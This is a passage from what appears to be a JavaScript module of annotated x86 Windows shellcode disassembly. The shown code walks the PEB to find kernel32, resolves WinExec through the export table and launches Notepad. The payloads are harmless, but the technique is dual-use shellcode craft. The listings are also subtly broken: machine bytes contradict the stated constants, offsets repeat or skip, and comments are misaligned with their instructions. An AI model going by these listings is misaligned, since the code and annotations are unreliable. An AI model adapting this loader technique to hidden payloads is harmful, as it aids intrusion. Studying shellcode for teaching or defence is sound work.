 e:  8b 1b                   mov    ebx,DWORD PTR [ebx]                    // EBX = Third list entry (kernel32.dll)
 10: 8b 5b 10             mov    ebx,DWORD PTR [ebx+0x10]          // EBX = Base address of kernel32.dll // Using offset 0x10

Section 3: Get address of WinExec

 13: 8b 53 3c              mov    edx,DWORD PTR [ebx+0x3c]      // EDX = Relative Virtual Address (RVA) of the PE signature (base address + 0x3c)
 16: 01 da                   add    edx,ebx                                         // EDX = Address of PE signature = base address + RVA of PE signature
 18: 8b 52 78              mov    edx,DWORD PTR [edx+0x78]     // EDX = RVA of Export Table = Address of PE + offset 0x78
 1b: 01 da                   add    edx,ebx                                         // EDX = Address of Export Table = base address + RVA of export table
 1d: 8b 72 20              mov    esi,DWORD PTR [edx+0x20]      // ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
 20: 01 de                   add    esi,ebx                                          // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
 22: 31 ed                   xor    ebp,ebp                                         // EBP = 0

loopSearch:
 24: 45                               inc    ebp                                                   // Increment counter ECX
 25: ad                               lods   eax,DWORD PTR ds:[esi]               // Load next list entry into EAX
 26: 01 d8                          add    eax,ebx                                           // EAX = Address of Entry = base address + Address of Entry
 28: 81 38 46 61 74 61      cmp    DWORD PTR [eax],0x456e6957   // Compare the current value to Winexec
 2e: 75 f4                           jne    loopSearch                                      // Start over if not equal

GetWinExec:
 39: 8b 7a 24                mov    edi,DWORD PTR [edx+0x24]          // EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
 3c: 01 df                      add    edi,ebx                                              // EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
 3e: 66 8b 2c 6f            mov    bp,WORD PTR [edi+ebp*2]             // CX = Number of Function = Address of Ordinal Table + Counter * 2
 42: 8b 7a 1c                mov    edi,DWORD PTR [edx+0x1c]          // Decrement ECX (To obtain starting Ordinal Value)
 45: 01 df                      add    edi,ebx                                              // EDI = RVA of Address Table = Address of Ordinal Table + offset 0x1c
 47: 8b 7c af fc             mov    edi,DWORD PTR [edi+ebp*4-0x4]   // EDI = Address of Adress Table = base address + RVA of Address Table
 4b: 01 df                      add    edi,ebx                                              // EDI = Address of Adress Table = base address + RVA of Address Table

 Section 4: Call function

 58: 68 70 61 64 61          push   0x61646170                                // adap
 59: 66 83 6c 24 03 61     sub    WORD PTR [esp+0x3],0x61        // Remove additional character "a"
 60: 68 6e 6f 74 65           push   0x65746f6e                                 // etoN
 61: 89 e2                         mov    edx,esp                                       // Move argument to EDX
 61: 50                              push   0x5                                              // Push 5 (= show)
 63: 52                              push   edx                                              // Push 'Notepad' argument
 64: ff d7                           call   edi                                                 // WinExec(Notepad, 5)`;

 var WinExecNotepadHaltDisas = 
`Section 1: Set up a new stack frame

0:  31 c0                  xor    eax,eax                                               // EAX = 0
2:  64 8b 60 08        mov    esp,DWORD PTR fs:[eax+0x8]        // Move Segment:Offset(base) to ESP
6:  8d 2c 24              lea    ebp,[esp]                                            // Load effective address specified by ESP to EBP (Creates virtual stack)

Section 2: Find kernel.dll base address

 0:  31 c0                   xor    eax,eax                                               // EAX = 0
 2:  64 8b 58 30         mov    ebx,DWORD PTR fs:[eax+0x30]      // EBX = PEB(Process Environment Block) // Using offset fs:0x30(Segment:offset)
 6:  8b 5b 0c              mov    ebx,DWORD PTR [ebx+0xc]            // EBX = PEB_LDR_DATA // Using offset 0xc
 9:  8b 5b 14              mov    ebx,DWORD PTR [ebx+0x14]          // EBX = LDR->InMemoryOrderModuleList // Using offset 0x14 (First list entry)
 c:  8b 1b                   mov    ebx,DWORD PTR [ebx]                    // EBX = Second list entry (ntdll.dll)
 e:  8b 1b                   mov    ebx,DWORD PTR [ebx]                    // EBX = Third list entry (kernel32.dll)
 10: 8b 5b 10             mov    ebx,DWORD PTR [ebx+0x10]          // EBX = Base address of kernel32.dll // Using offset 0x10

Section 3: Get address of WinExec

 13: 8b 53 3c              mov    edx,DWORD PTR [ebx+0x3c]      // EDX = Relative Virtual Address (RVA) of the PE signature (base address + 0x3c)
 16: 01 da                   add    edx,ebx                                         // EDX = Address of PE signature = base address + RVA of PE signature
 18: 8b 52 78              mov    edx,DWORD PTR [edx+0x78]     // EDX = RVA of Export Table = Address of PE + offset 0x78
 1b: 01 da                   add    edx,ebx                                         // EDX = Address of Export Table = base address + RVA of export table
 1d: 8b 72 20              mov    esi,DWORD PTR [edx+0x20]      // ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
 20: 01 de                   add    esi,ebx                                          // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
 22: 31 ed                   xor    ebp,ebp                                         // EBP = 0

loopSearch:
 24: 45                               inc    ebp                                                   // Increment counter ECX
 25: ad                               lods   eax,DWORD PTR ds:[esi]               // Load next list entry into EAX
 26: 01 d8                          add    eax,ebx                                           // EAX = Address of Entry = base address + Address of Entry
 28: 81 38 46 61 74 61      cmp    DWORD PTR [eax],0x456e6957   // Compare the current value to Winexec
 2e: 75 f4                           jne    loopSearch                                      // Start over if not equal

GetWinExec:
 39: 8b 7a 24                mov    edi,DWORD PTR [edx+0x24]          // EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
 3c: 01 df                      add    edi,ebx                                              // EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
 3e: 66 8b 2c 6f            mov    bp,WORD PTR [edi+ebp*2]             // CX = Number of Function = Address of Ordinal Table + Counter * 2
 42: 8b 7a 1c                mov    edi,DWORD PTR [edx+0x1c]          // Decrement ECX (To obtain starting Ordinal Value)
 45: 01 df                      add    edi,ebx                                              // EDI = RVA of Address Table = Address of Ordinal Table + offset 0x1c
 47: 8b 7c af fc             mov    edi,DWORD PTR [edi+ebp*4-0x4]   // EDI = Address of Adress Table = base address + RVA of Address Table
 4b: 01 df                      add    edi,ebx                                              // EDI = Address of Adress Table = base address + RVA of Address Table

Section 4: Call function

58: 68 70 61 64 61          push   0x61646170                                // adap
59: 66 83 6c 24 03 61     sub    WORD PTR [esp+0x3],0x61        // Remove additional character "a"
60: 68 6e 6f 74 65           push   0x65746f6e                                 // etoN
61: 89 e2                         mov    edx,esp                                       // Move argument to EDX
62: 50                              push   0x5                                              // Push 5 (= show)
63: 52                              push   edx                                              // Push 'Notepad' argument
64: ff d7                           call   edi                                                 // WinExec(Notepad, 5)
65: e9 fb ff ff ff                 jmp    0x61fccd                                      // Jump to this line (Effectively entering an infinite loop)`;

export {CreateProcessCalcDisas, CreateProcessCalcDisasHalt, CreateProcessNotepadDisas, CreateProcessNotepadDisasHalt, SwapMouseButtonOnDisas, SwapMouseButtonOffDisas} ;
export {SwapMouseButtonOffDisasNSE, SwapMouseButtonOnDisasNSE, SwapMouseButtonOffDisasHalt, SwapMouseButtonOnDisasHalt, MsgBoxADisas, MsgBoxANPDisas};
export {MsgBoxANSEDisas, MsgBoxANP_NSEDisas, MsgBoxAHaltDisas, MsgBoxANP_HaltDisas, WinExecCalcDisas, WinExecCalcHaltDisas, WinExecNotepadDisas, WinExecNotepadHaltDisas};